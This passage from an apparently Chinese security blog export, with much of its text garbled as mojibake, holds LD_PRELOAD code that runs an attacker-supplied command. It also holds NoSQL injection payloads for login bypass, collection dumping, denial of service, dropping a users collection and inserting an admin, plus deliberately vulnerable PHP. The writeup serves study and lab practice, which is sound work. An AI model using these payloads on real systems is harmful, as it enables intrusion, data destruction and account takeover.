char** environ; __attribute__ ((__constructor__)) void preload (void) { // get command line options and arg const char* cmdline = getenv(\u0026#34;EVIL_CMDLINE\u0026#34;); // unset environment variable LD_PRELOAD. // unsetenv(\u0026#34;LD_PRELOAD\u0026#34;) no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \u0026#34;LD_PRELOAD\u0026#34;)) { environ[i][0] = \u0026#39;\\0\u0026#39;; } } // executive command system(cmdline); } bypass File suffix #\rå…¶å®å°±æ˜¯åç¼€ååŒ…æ‹¬ä½†ä¸é™äºsoéƒ½å¯ä»¥è¢«æ‰§è¡Œï¼Œåç¼€åè¢«bançš„æ—¶å€™å¯bypass\n0x04 Conculsion #\rå…¶å®è¿™ä¸ªæ¼æ´çš„æœ¬è´¨å°±æ˜¯åˆ©ç”¨linkerå¯¹ç¯å¢ƒå˜é‡è¿›è¡Œè¦†ç›–æ“ä½œä»è€Œç»•è¿‡ä¸€äº›å‡½æ•°çš„é™åˆ¶è¿›è¡Œgetshellï¼Œè¿™è®©æˆ‘ä¸ç¦æƒ³èµ·åœ¨n1junior2024ä¸­çš„é‚£é“golangçš„ç¯å¢ƒå˜é‡æ³¨å…¥rceï¼Œéƒ½æ˜¯å¯¹ç¯å¢ƒå˜é‡è¿›è¡Œæ³¨å…¥è¿›è¡Œrceï¼Œåç»­åº·åº·ç ”ç©¶ä¸‹é‚£é“é¢˜ç›®ï¼ˆæ²¡è§£å‡ºæ¥å¤ªèœäº†wwwï¼‰\nå‚è€ƒæ–‡ç« ï¼š https://forum.butian.net/share/1493 https://medium.com/@hovakimyan29/demystifying-linking-in-software-development-931e67d48fad\n","date":"21 February 2024","externalUrl":null,"permalink":"/posts/ld_preload/","section":"Posts","summary":"","title":"LD_PRELOADå­¦ä¹ ","type":"posts"},{"content":"","date":"21 February 2024","externalUrl":null,"permalink":"/categories/web/","section":"Categories","summary":"","title":"WEB","type":"categories"},{"content":"","date":"21 February 2024","externalUrl":null,"permalink":"/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/","section":"Tags","summary":"","title":"ç¯å¢ƒå˜é‡æ³¨å…¥","type":"tags"},{"content":"","date":"1 February 2024","externalUrl":null,"permalink":"/tags/nosql/","section":"Tags","summary":"","title":"NOSQL","type":"tags"},{"content":"NoSQL Inject #\rNoSQL(NOT ONLY SQL)ï¼Œå®ƒå’Œæˆ‘ä»¬å¸¸è§çš„sqlæ³¨å…¥å¾ˆåƒã€‚ å®ƒçš„å±å®³æœ‰ï¼š\nç»•è¿‡èº«ä»½éªŒè¯æˆ–ä¿æŠ¤æœºåˆ¶ã€‚ æå–æˆ–ç¼–è¾‘æ•°æ®ã€‚ å¯¼è‡´æ‹’ç»æœåŠ¡ã€‚ åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»£ç ã€‚ å…¶å®æ³¨å…¥çš„æœ¬è´¨éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯è¯­æ³•æœ‰äº›ä¸ä¸€æ · 0x001 NoSQL database #\rNoSQL æ•°æ®åº“ä»¥ä¼ ç»Ÿ SQL å…³ç³»è¡¨ä»¥å¤–çš„æ ¼å¼å­˜å‚¨å’Œæ£€ç´¢æ•°æ®ã€‚å®ƒä»¬æ—¨åœ¨å¤„ç†å¤§é‡éç»“æ„åŒ–æˆ–åŠç»“æ„åŒ–æ•°æ®ã€‚å› æ­¤ï¼Œå®ƒä»¬é€šå¸¸æ¯” SQL å…·æœ‰æ›´å°‘çš„å…³ç³»çº¦æŸå’Œä¸€è‡´æ€§æ£€æŸ¥ï¼Œå¹¶ä¸”åœ¨å¯æ‰©å±•æ€§ã€çµæ´»æ€§å’Œæ€§èƒ½æ–¹é¢å…·æœ‰æ˜¾ç€çš„ä¼˜åŠ¿ã€‚\nä¸ SQL æ•°æ®åº“ä¸€æ ·ï¼Œç”¨æˆ·ä½¿ç”¨åº”ç”¨ç¨‹åºä¼ é€’åˆ°æ•°æ®åº“çš„æŸ¥è¯¢ä¸ NoSQL æ•°æ®åº“ä¸­çš„æ•°æ®è¿›è¡Œäº¤äº’ã€‚ç„¶è€Œï¼Œä¸åŒçš„NoSQLæ•°æ®åº“ä½¿ç”¨å¤šç§æŸ¥è¯¢è¯­è¨€ï¼Œè€Œä¸æ˜¯åƒSQLï¼ˆç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€ï¼‰è¿™æ ·çš„é€šç”¨æ ‡å‡†ã€‚è¿™å¯èƒ½æ˜¯è‡ªå®šä¹‰æŸ¥è¯¢è¯­è¨€æˆ–é€šç”¨è¯­è¨€ï¼ˆå¦‚ XML æˆ– JSONï¼‰ã€‚ï¼ˆæ‰€ä»¥é»‘å®¢å¯ä»¥ä½¿ç”¨è¿‡ç¨‹æ€§çš„è¯­è¨€è€Œä¸æ˜¯sqlæ¥è¿›è¡Œæ”»å‡»ï¼Œå¹¶ä¸”å¯èƒ½ä¼šæ¯”ä¼ ç»Ÿçš„sqlæ³¨å…¥æ›´å…·æœ‰å±å®³æ€§ã€‚ï¼‰\nNoSQL æ•°æ®åº“ä¸æ”¯æŒä¸€ç§æ ‡å‡†åŒ–æŸ¥è¯¢è¯­è¨€ï¼Œå› æ­¤å…è®¸çš„ç¡®åˆ‡æŸ¥è¯¢å–å†³äºï¼š\næ•°æ®åº“å¼•æ“â€” ä¾‹å¦‚ MongoDBã€Cassandraã€Redis æˆ– Google Bigtable ç¼–ç¨‹è¯­è¨€â€” ä¾‹å¦‚ Pythonã€PHP å¼€å‘æ¡†æ¶â€”â€”ä¾‹å¦‚ Angularã€Node.js 0x002NoSQL database models #\rç±»å‹ éƒ¨åˆ†ä»£è¡¨ ç‰¹ç‚¹ åˆ—å­˜å‚¨ Hbase\nCassandra\nHypertable é¡¾åæ€ä¹‰ï¼Œæ˜¯æŒ‰åˆ—å­˜å‚¨æ•°æ®çš„ã€‚æœ€å¤§çš„ç‰¹ç‚¹æ˜¯æ–¹ä¾¿å­˜å‚¨ç»“æ„åŒ–å’ŒåŠç»“æ„åŒ–æ•°æ®ï¼Œæ–¹ä¾¿åšæ•°æ®å‹ç¼©ï¼Œå¯¹é’ˆå¯¹æŸä¸€åˆ—æˆ–è€…æŸå‡ åˆ—çš„æŸ¥è¯¢æœ‰éå¸¸å¤§çš„IOä¼˜åŠ¿ã€‚ æ–‡æ¡£å­˜å‚¨ MongoDB\nCouchDB æ–‡æ¡£å­˜å‚¨ä¸€èˆ¬ç”¨ç±»ä¼¼jsonçš„æ ¼å¼å­˜å‚¨ï¼Œå­˜å‚¨çš„å†…å®¹æ˜¯æ–‡æ¡£å‹çš„ã€‚è¿™æ ·ä¹Ÿå°±æœ‰æœºä¼šå¯¹æŸäº›å­—æ®µå»ºç«‹ç´¢å¼•ï¼Œå®ç°å…³ç³»æ•°æ®åº“çš„æŸäº›åŠŸèƒ½ã€‚ key-valueå­˜å‚¨ TokyoÂ CabinetÂ /Â Tyrant\nBerkeleyÂ DB\nMemcacheDB\nRedis å¯ä»¥é€šè¿‡keyå¿«é€ŸæŸ¥è¯¢åˆ°å…¶valueã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå­˜å‚¨ä¸ç®¡valueçš„æ ¼å¼ï¼Œç…§å•å…¨æ”¶ã€‚ï¼ˆRedisåŒ…å«äº†å…¶ä»–åŠŸèƒ½ï¼‰ å›¾å­˜å‚¨ Neo4J\nFlockDB å›¾å½¢å…³ç³»çš„æœ€ä½³å­˜å‚¨ã€‚ä½¿ç”¨ä¼ ç»Ÿå…³ç³»æ•°æ®åº“æ¥è§£å†³çš„è¯æ€§èƒ½ä½ä¸‹ï¼Œè€Œä¸”è®¾è®¡ä½¿ç”¨ä¸æ–¹ä¾¿ã€‚ å¯¹è±¡å­˜å‚¨ db4o\nVersant é€šè¿‡ç±»ä¼¼é¢å‘å¯¹è±¡è¯­è¨€çš„è¯­æ³•æ“ä½œæ•°æ®åº“ï¼Œé€šè¿‡å¯¹è±¡çš„æ–¹å¼å­˜å–æ•°æ®ã€‚ xmlæ•°æ®åº“ BerkeleyÂ DBÂ XML\nBaseX é«˜æ•ˆçš„å­˜å‚¨XMLæ•°æ®ï¼Œå¹¶æ”¯æŒXMLçš„å†…éƒ¨æŸ¥è¯¢è¯­æ³•ï¼Œæ¯”å¦‚XQuery,Xpathã€‚ 0x003æ³¨å…¥çš„ç±»å‹ #\ræœ‰ä¸¤ç§ NoSQL æ³¨å…¥åˆ†ç±»çš„æ–¹å¼ï¼š\nç¬¬ä¸€ç§æ˜¯æŒ‰ç…§è¯­è¨€çš„åˆ†ç±»ï¼Œå¯ä»¥åˆ†ä¸ºï¼šPHP æ•°ç»„æ³¨å…¥ï¼ŒJavaScript æ³¨å…¥å’Œ Mongo Shell æ‹¼æ¥æ³¨å…¥ç­‰ç­‰ã€‚\nç¬¬äºŒç§æ˜¯æŒ‰ç…§æ”»å‡»æœºåˆ¶åˆ†ç±»ï¼Œå¯ä»¥åˆ†ä¸ºï¼šé‡è¨€å¼æ³¨å…¥ï¼Œè”åˆæŸ¥è¯¢æ³¨å…¥ï¼ŒJavaScript æ³¨å…¥ã€ç›²æ³¨ç­‰ï¼Œè¿™ç§åˆ†ç±»æ–¹å¼å¾ˆåƒä¼ ç»Ÿ SQL æ³¨å…¥çš„åˆ†ç±»æ–¹å¼ã€‚\né‡è¨€å¼æ³¨å…¥ åˆç§°ä¸ºæ°¸çœŸå¼ï¼Œæ­¤ç±»æ”»å‡»æ˜¯åœ¨æ¡ä»¶è¯­å¥ä¸­æ³¨å…¥ä»£ç ï¼Œä½¿ç”Ÿæˆçš„è¡¨è¾¾å¼åˆ¤å®šç»“æœæ°¸è¿œä¸ºçœŸï¼Œä»è€Œç»•è¿‡è®¤è¯æˆ–è®¿é—®æœºåˆ¶ã€‚\nè”åˆæŸ¥è¯¢æ³¨å…¥ è”åˆæŸ¥è¯¢æ˜¯ä¸€ç§ä¼—æ‰€å‘¨çŸ¥çš„ SQL æ³¨å…¥æŠ€æœ¯ï¼Œæ”»å‡»è€…åˆ©ç”¨ä¸€ä¸ªè„†å¼±çš„å‚æ•°å»æ”¹å˜ç»™å®šæŸ¥è¯¢è¿”å›çš„æ•°æ®é›†ã€‚è”åˆæŸ¥è¯¢æœ€å¸¸ç”¨çš„ç”¨æ³•æ˜¯ç»•è¿‡è®¤è¯é¡µé¢è·å–æ•°æ®ã€‚\nJavaScript æ³¨å…¥ MongoDB Server æ”¯æŒ JavaScriptï¼Œè¿™ä½¿å¾—åœ¨æ•°æ®å¼•æ“è¿›è¡Œå¤æ‚äº‹åŠ¡å’ŒæŸ¥è¯¢æˆä¸ºå¯èƒ½ï¼Œä½†æ˜¯ä¼ é€’ä¸å¹²å‡€çš„ç”¨æˆ·è¾“å…¥åˆ°è¿™äº›æŸ¥è¯¢ä¸­å¯ä»¥æ³¨å…¥ä»»æ„çš„ JavaScript ä»£ç ï¼Œå¯¼è‡´éæ³•çš„æ•°æ®è·å–æˆ–ç¯¡æ”¹ã€‚\nç›²æ³¨ å½“é¡µé¢æ²¡æœ‰å›æ˜¾æ—¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡Â $regexÂ æ­£åˆ™è¡¨è¾¾å¼æ¥è¾¾åˆ°å’Œä¼ ç»Ÿ SQL æ³¨å…¥ä¸­Â substr()Â å‡½æ•°ç›¸åŒçš„åŠŸèƒ½ï¼Œè€Œä¸” NoSQL ç”¨åˆ°çš„åŸºæœ¬ä¸Šéƒ½æ˜¯å¸ƒå°”ç›²æ³¨ã€‚ åœ¨portswiggerä¸­çš„è§£é‡Šï¼š\nè¯­æ³•æ³¨å…¥ å½“æ‚¨å¯ä»¥ç ´å NoSQL æŸ¥è¯¢è¯­æ³•ï¼Œä»è€Œä½¿æ‚¨èƒ½å¤Ÿæ³¨å…¥è‡ªå·±çš„æœ‰æ•ˆè´Ÿè½½æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚è¯¥æ–¹æ³•ä¸ SQL æ³¨å…¥ä¸­ä½¿ç”¨çš„æ–¹æ³•ç±»ä¼¼ã€‚ç„¶è€Œï¼Œæ”»å‡»çš„æ€§è´¨å·®å¼‚å¾ˆå¤§ï¼Œå› ä¸º NoSQL æ•°æ®åº“ä½¿ç”¨ä¸€ç³»åˆ—æŸ¥è¯¢è¯­è¨€ã€æŸ¥è¯¢è¯­æ³•ç±»å‹å’Œä¸åŒçš„æ•°æ®ç»“æ„ã€‚ è¿ç®—ç¬¦æ³¨å…¥ - å½“æ‚¨å¯ä»¥ä½¿ç”¨ NoSQL æŸ¥è¯¢è¿ç®—ç¬¦æ¥æ“ä½œæŸ¥è¯¢æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æƒ…å†µã€‚ 0x004åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ #\rè¿™é‡Œæˆ‘å°±æ‹¿portswiggerçš„åœ¨çº¿labåšä¾‹å­ï¼Œå°±ä¸é¢å¤–æ­å»ºç¯å¢ƒäº† è¿™é‡Œé¦–å…ˆæ˜¯ä¸€ä¸ªå•†åŸçš„ç•Œé¢ï¼Œéšä¾¿ç‚¹å‡»ä¸€ä¸ªcategory url: /filter?category=Accessories å¯ä»¥çœ‹è§è¿™é‡Œæœ‰ç±»ä¼¼äºæŸ¥è¯¢çš„æ„æ€ï¼Œæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå•å¼•å·è¯•è¯• å¯ä»¥çœ‹è§æŠ¥é”™äº†ï¼ŒæŠ¥é”™å†…å®¹ï¼š\nCommand failed with error 139 (JSInterpreterFailure): \u0026#39;SyntaxError: unterminated string literal : functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25 \u0026#39; on server 127.0.0.1:27017. The full response is {\u0026#34;ok\u0026#34;: 0.0, \u0026#34;errmsg\u0026#34;: \u0026#34;SyntaxError: unterminated string literal :\\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\\n\u0026#34;, \u0026#34;code\u0026#34;: 139, \u0026#34;codeName\u0026#34;: \u0026#34;JSInterpreterFailure\u0026#34;} å¾ˆæ˜æ˜¾å¯ä»¥çœ‹è§mogodbçš„æ“ä½œã€‚é‚£ä¹ˆæˆ‘ä»¬è¿˜è¦åˆ¤æ–­ä»–æ˜¯å¦ä¼šæŠŠurlçš„å†…å®¹å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ï¼Œæ‰€ä»¥æˆ‘ä»¬æ„é€ Accessories'\u0026amp;\u0026amp; 0 \u0026amp;\u0026amp; 'x å¯ä»¥çœ‹è§æ˜¯è¿”å›æ­£å¸¸çš„ï¼Œè¯´æ˜è¿™é‡Œå­˜åœ¨æ³¨å…¥,æˆ‘ä»¬å†æ„é€ ä¸€æ¬¡ä¸ºçœŸçš„æ¡ä»¶ï¼Œå°±ä¼šå‘ç°ä¼šè¿”å›æ‰€æœ‰å•†å“ä¿¡æ¯ï¼Œplayload:https://xxxxxxxxxxxxx.web-security-academy.net/filter?category=accessories%27%7c%7c1%7c%7c%27\nä¹Ÿå°±æ˜¯accessories\u0026rsquo;||\u0026lsquo;1\u0026rsquo;==\u0026lsquo;1\u0026rsquo; Inject function #\ré‡è¨€å¼æ³¨å…¥ #\rvar user = db.users.find({\u0026#34;username\u0026#34;: userInputUsername, \u0026#34;password\u0026#34;: userInputPassword}); æ”»å‡»è€…å¯ä»¥æ„é€ {\u0026quot;$gt\u0026quot;:\u0026quot;\u0026quot;}æ¥è¿›è¡Œç»•è¿‡\nvar user = db.users.find({\u0026#34;username\u0026#34;: \u0026#34;administrator\u0026#34;, \u0026#34;password\u0026#34;: {\u0026#34;$gt\u0026#34;: \u0026#34;\u0026#34;}}); MongoDB ä¸­çš„è¿ç®—\u0026quot;$gt\u0026quot;ç¬¦çš„æ„æ€æ˜¯â€œå¤§äºâ€ã€‚é€šè¿‡å°†è¯¥å€¼è®¾ç½®ä¸ºç©ºå­—ç¬¦ä¸²ï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡èº«ä»½éªŒè¯ï¼Œå› ä¸ºæŸ¥è¯¢å°†è¿”å›ç”¨æˆ·åå’Œå¯†ç å¤§äºç©ºå­—ç¬¦ä¸²çš„ç¬¬ä¸€ä¸ªç”¨æˆ·ã€‚\nè¿™é‡Œä¹Ÿæ”¾ä¸€ä¸‹Marcus_Hollowayå¸ˆå‚…çš„index.php\n\u0026lt;?php $manager = new MongoDB\\Driver\\Manager(\u0026#34;mongodb://127.0.0.1:27017\u0026#34;); $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $query = new MongoDB\\Driver\\Query(array( \u0026#39;username\u0026#39; =\u0026gt; $username, \u0026#39;password\u0026#39; =\u0026gt; $password )); $result = $manager-\u0026gt;executeQuery(\u0026#39;test.users\u0026#39;, $query)-\u0026gt;toArray(); $count = count($result); if ($count \u0026gt; 0) { foreach ($result as $user) { $user = ((array)$user); echo \u0026#39;====Login Success====\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;username:\u0026#39; . $user[\u0026#39;username\u0026#39;] . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;password:\u0026#39; . $user[\u0026#39;password\u0026#39;] . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; } } else{ echo \u0026#39;Login Failed\u0026#39;; } ?\u0026gt; æ­£å¸¸ç”¨æˆ·ç™»å½•çš„æ—¶å€™\nusername=whoami\u0026amp;password=657260 å…¶å®æ‰§è¡Œçš„å‘½ä»¤å’Œæˆ‘ä¸Šé¢ä¸¾çš„ä¾‹å­æ˜¯ä¸€æ ·çš„ å¦‚æœè¿™ä¸ªæ—¶å€™ä¼ å‚\nusername[$ne]=1%password[$ne]=1 è¿™æ ·ä¹Ÿå¯æ„é€ å‡ºä¸€ä¸ªtrueï¼Œä¹Ÿå°±æ˜¯å’Œæˆ‘ä»¬sqlæ³¨å…¥ä¸­çš„ä¸‡èƒ½å¯†ç admin\u0026rsquo; or 1=1\u0026ndash;+ ä¸€ä¸ªåŸç†ï¼Œå°±æ˜¯æ„é€ æ°¸çœŸæ¡ä»¶\nè¿ç®—ç¬¦æ³¨å…¥ #\rNoSQL æ•°æ®åº“ç»å¸¸ä½¿ç”¨æŸ¥è¯¢è¿ç®—ç¬¦ï¼Œå®ƒæä¾›äº†æŒ‡å®šæ•°æ®å¿…é¡»æ»¡è¶³çš„æ¡ä»¶æ‰èƒ½åŒ…å«åœ¨æŸ¥è¯¢ç»“æœä¸­çš„æ–¹æ³•ã€‚ MongoDB æŸ¥è¯¢è¿ç®—ç¬¦çš„ç¤ºä¾‹åŒ…æ‹¬ï¼š\n$where- åŒ¹é…æ»¡è¶³ JavaScript è¡¨è¾¾å¼çš„æ–‡æ¡£ã€‚ $ne- åŒ¹é…æ‰€æœ‰ä¸ç­‰äºæŒ‡å®šå€¼çš„å€¼ã€‚ $in- åŒ¹é…æ•°ç»„ä¸­æŒ‡å®šçš„æ‰€æœ‰å€¼ã€‚ $regex- é€‰æ‹©å€¼ä¸æŒ‡å®šæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ–‡æ¡£ã€‚ å¯¹äºåŸºäº URL çš„è¾“å…¥ï¼Œæ‚¨å¯ä»¥é€šè¿‡ URL å‚æ•°æ’å…¥æŸ¥è¯¢è¿ç®—ç¬¦ã€‚ä¾‹å¦‚ï¼Œusername=wienerå˜ä¸ºÂ username[$ne]=invalid.å¦‚æœè¿™ä¸èµ·ä½œç”¨ï¼Œæ‚¨å¯ä»¥å°è¯•ä»¥ä¸‹æ“ä½œï¼š\nå°†è¯·æ±‚æ–¹æ³•ä» è½¬æ¢GETä¸ºPOST. å°†Content-Typeæ ‡é¢˜æ›´æ”¹ä¸ºapplication/json. å°† JSON æ·»åŠ åˆ°æ¶ˆæ¯æ­£æ–‡ã€‚ åœ¨ JSON ä¸­æ³¨å…¥æŸ¥è¯¢è¿ç®—ç¬¦ã€‚ è¿›æ¥æœ‰ä¸ªloginé¡µé¢ æŠ“ä¸ªåŒ…çœ‹çœ‹ POST /login HTTP/1.1 Host: xxxxxxxxxxxxx.web-security-academy.net Cookie: session=djMoS9NuJRKCDsBfzRpHwzdkyy9EqZEC User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: https://xxxxxxxxxxx7.web-security-academy.net/login Content-Type: application/json Content-Length: 39 Origin: https://xxxxxxxxxxx.web-security-academy.net Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin Te: trailers Connection: close {\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;admin\u0026#34;} å¯ä»¥çœ‹è§æœ€åé¢ä¼ äº†jsonæ ¼å¼çš„æ–‡ä»¶ æˆ‘ä»¬çœ‹è§é¢˜ç›®è¦æ±‚ç™»å½•adminçš„è´¦æˆ·ï¼Œæ‰€ä»¥å°±æ„é€ playload playloadï¼š {\u0026ldquo;username\u0026rdquo;:{\u0026quot;$regex\u0026quot;:\u0026ldquo;admin.*\u0026rdquo;}, \u0026ldquo;password\u0026rdquo;:{\u0026quot;$ne\u0026quot;:\u0026quot;\u0026quot;}} å¯ä»¥çœ‹è§ä¹Ÿæ˜¯æˆåŠŸç™»å½•\nè¿™é‡Œä¹Ÿå§Må¸ˆå‚…çš„JavaScriptæ³¨å…¥çš„ä¸€äº›ç¬”è®°å†™è¿›æ¥ï¼Œå› ä¸ºç®—æ˜¯åŒä¸€ä¸ªçŸ¥è¯†ç‚¹äº†åªä¸è¿‡å¸ˆå‚…ç”¨çš„æ˜¯whereè¿™ä¸ªæ–¹æ³•\nexampleï¼š\ndb.users.find({ $where: \u0026#34;function(){return(this.username == $userData)}\u0026#34; }) æ„é€ å»¶è¿Ÿï¼š\ndb.users.find({ $where: \u0026#34;function(){return(this.username == \u0026#39;a\u0026#39;; sleep(5000))}\u0026#34; }) MongoDB 2.4 ä¹‹å‰ åœ¨ MongoDB 2.4 ä¹‹å‰ï¼Œé€šè¿‡Â $whereÂ æ“ä½œç¬¦ä½¿ç”¨Â map-reduceã€groupÂ å‘½ä»¤å¯ä»¥è®¿é—®åˆ° Mongo Shell ä¸­çš„å…¨å±€å‡½æ•°å’Œå±æ€§ï¼Œå¦‚Â dbï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥é€šè¿‡è‡ªå®šä¹‰ JavaScript å‡½æ•°æ¥è·å–æ•°æ®åº“çš„æ‰€æœ‰ä¿¡æ¯ã€‚\nå¦‚ä¸‹æ‰€ç¤ºï¼Œå‘é€ä»¥ä¸‹æ•°æ®åï¼Œå¦‚æœæœ‰å›æ˜¾çš„è¯å°†è·å–å½“å‰æ•°æ®åº“ä¸‹æ‰€æœ‰çš„é›†åˆåï¼š\nusername=1\u0026amp;password=1\u0026#39;;(function(){return(tojson(db.getCollectionNames()))})();var a=\u0026#39;1 MongoDB 2.4 ä¹‹å MongoDB 2.4 ä¹‹åÂ dbÂ å±æ€§è®¿é—®ä¸åˆ°äº†ï¼Œä½†æˆ‘ä»¬åº”ç„¶å¯ä»¥æ„é€ ä¸‡èƒ½å¯†ç ã€‚å¦‚æœæ­¤æ—¶æˆ‘ä»¬å‘é€ä»¥ä¸‹è¿™å‡ ç§æ•°æ®ï¼š\nusername=1\u0026amp;password=1\u0026#39;;return true// æˆ– username=1\u0026amp;password=1\u0026#39;;return true;var a=\u0026#39;1 ä¹Ÿæ˜¯å¯ä»¥æŸ¥å‡ºæ‰€æœ‰ä¿¡æ¯çš„ DOSçš„ä¸€ä¸ªplayloadï¼š\nusername=1\u0026amp;password=1\u0026#39;;(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date\u0026lt;5000); return Math.max();})();var a=\u0026#39;1 ä¹Ÿå°±æ˜¯ä¸€ç›´å¾ªç¯å˜›\nè”åˆæŸ¥è¯¢æ³¨å…¥ #\rå‡è®¾åç«¯çš„ MongoDB æŸ¥è¯¢è¯­å¥ä½¿ç”¨äº†å­—ç¬¦ä¸²æ‹¼æ¥ï¼š\nstring query =\u0026#34;{ username: \u0026#39;\u0026#34; + $username + \u0026#34;\u0026#39;, password: \u0026#39;\u0026#34; + $password + \u0026#34;\u0026#39; }\u0026#34; å½“ç”¨æˆ·æ­£ç¡®çš„ç”¨æˆ·åå¯†ç è¿›è¡Œç™»å½•æ—¶ï¼Œå¾—åˆ°çš„æŸ¥è¯¢è¯­å¥æ˜¯åº”è¯¥è¿™æ ·çš„ï¼š\n{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;, \u0026#39;password\u0026#39;:\u0026#39;123456\u0026#39;} å¦‚æœæ­¤æ—¶æ²¡æœ‰å¾ˆå¥½åœ°å¯¹ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè¿‡æ»¤æˆ–è€…æ•ˆéªŒï¼Œé‚£æ”»å‡»è€…ä¾¿å¯ä»¥æ„é€ å¦‚ä¸‹ payloadï¼š\nusername=admin\u0026#39;, $or: [ {}, {\u0026#39;a\u0026#39;: \u0026#39;a\u0026amp;password=\u0026#39; }], $comment: \u0026#39;123456 æ‹¼æ¥å…¥æŸ¥è¯¢è¯­å¥åç›¸å½“äºæ‰§è¡Œäº†ï¼š\n{ username: \u0026#39;admin\u0026#39;, $or: [ {}, {\u0026#39;a\u0026#39;:\u0026#39;a\u0026#39;, password: \u0026#39;\u0026#39; }], $comment: \u0026#39;123456\u0026#39;} æ­¤æ—¶ï¼Œåªè¦ç”¨æˆ·åæ˜¯æ­£ç¡®çš„ï¼Œè¿™ä¸ªæŸ¥è¯¢å°±å¯ä»¥æˆåŠŸã€‚è¿™ç§æ‰‹æ³•å’Œ SQL æ³¨å…¥æ¯”è¾ƒç›¸ä¼¼ï¼š\nselect * from logins where username = \u0026#39;admin\u0026#39; and (password true\u0026lt;\u0026gt; or (\u0026#39;a\u0026#39;=\u0026#39;a\u0026#39; and password = \u0026#39;\u0026#39;)) è¿™æ ·ï¼ŒåŸæœ¬æ­£å¸¸çš„æŸ¥è¯¢è¯­å¥ä¼šè¢«è½¬æ¢ä¸ºå¿½ç•¥å¯†ç çš„ï¼Œåœ¨æ— éœ€å¯†ç çš„æƒ…å†µä¸‹ç›´æ¥ç™»å½•ç”¨æˆ·è´¦å·ï¼Œå› ä¸ºÂ ()Â å†…çš„æ¡ä»¶æ€»æ˜¯æ°¸çœŸçš„ã€‚\nä½¿ç”¨ Command æ–¹æ³•é€ æˆçš„æ³¨å…¥ #\ræ‡’äº†ï¼Œè¿™é‡Œä¹Ÿæ˜¯ç›´æ¥è´´å‡ºæ¥\n\u0026lt;?php $manager = new MongoDB\\Driver\\Manager(\u0026#34;mongodb://127.0.0.1:27017\u0026#34;); $username = $_POST[\u0026#39;username\u0026#39;]; $cmd = new MongoDB\\Driver\\Command( [ \u0026#39;eval\u0026#39; =\u0026gt; \u0026#34;db.users.distinct(\u0026#39;username\u0026#39;,{\u0026#39;username\u0026#39;:\u0026#39;$username\u0026#39;})\u0026#34; ] ); $result = $manager-\u0026gt;executeCommand(\u0026#39;test.users\u0026#39;, $cmd)-\u0026gt;toArray(); $count = count($result); if ($count \u0026gt; 0) { foreach ($result as $user) { $user = ((array)$user); echo \u0026#39;====Login Success====\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;username:\u0026#39; . $user[\u0026#39;username\u0026#39;] . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;password:\u0026#39; . $user[\u0026#39;password\u0026#39;] . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; } } else{ echo \u0026#39;Login Failed\u0026#39;; } ?\u0026gt; playload:\nusername=1\u0026#39;});db.users.drop();db.user.find({\u0026#39;username\u0026#39;:\u0026#39;1 username=1\u0026#39;});db.users.insert({\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;password\u0026#34;:123456\u0026#34;});db.users.find({\u0026#39;username\u0026#39;:\u0026#39;1 ç›²æ³¨ #\rå¸ƒå°”ç›²æ³¨ #\rindex.php\n\u0026lt;?php $manager = new MongoDB\\Driver\\Manager(\u0026#34;mongodb://127.0.0.1:27017\u0026#34;); $username = $_POST[\u0026#39;username\u0026#39;]; $password = $_POST[\u0026#39;password\u0026#39;]; $query = new MongoDB\\Driver\\Query(array( \u0026#39;username\u0026#39; =\u0026gt; $username, \u0026#39;password\u0026#39; =\u0026gt; $password )); $result = $manager-\u0026gt;executeQuery(\u0026#39;test.users\u0026#39;, $query)-\u0026gt;toArray(); $count = count($result); if ($count \u0026gt; 0) { foreach ($result as $user) { $user = ((array)$user); echo \u0026#39;====Login Success====\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;username:\u0026#39; . $user[\u0026#39;username\u0026#39;] . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; echo \u0026#39;password:\u0026#39; . $user[\u0026#39;password\u0026#39;] . \u0026#39;\u0026lt;br\u0026gt;\u0026#39;; } } else{ echo \u0026#39;Login Failed\u0026#39;; } ?\u0026gt; åˆ¤æ–­playloadï¼š\nusername=admin\u0026amp;password[$regex]=.{number} é™„ä¸Šmå¸ˆå‚…çš„ç›²æ³¨è„šæœ¬\nimport requests import string password = \u0026#39;\u0026#39; url = \u0026#39;http://192.168.226.148/index.php\u0026#39; while True: for 